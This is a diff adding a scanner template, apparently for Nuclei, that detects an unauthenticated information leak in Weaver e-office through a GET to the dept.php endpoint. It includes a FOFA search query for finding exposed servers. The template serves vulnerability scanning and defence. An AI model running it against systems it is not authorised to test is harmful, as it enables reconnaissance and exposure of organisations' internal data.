@@ -1,0 +1,23 @@
+id: weaver-e-office-dept-unauthorized
+
+info:
+  name: 泛微e-office dept.php接口未授权信息泄露
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="eoffice_loading_tip" || body="/eoffice10/client/web/" || ((header="general/login/index.php" || body="/general/login/view//images/updateLoad.gif" || (body="szFeatures" && body="eoffice") || header="Server: eOffice") && body!="Server: couchdb") || banner="general/login/index.php"|| (body="login.php"&&body="eoffice")||body="/general/login/index.php"||body="/eoffice10/"||body="window.opener=\"eoffice\"" && body ="redirectUrl = \"login.php\"" && body ="szFeatures +=\"resizable=yes\""|| body="get_current_lan_version"
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    GET /E-mobile/App/System/UserSelect/dept.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'tree'
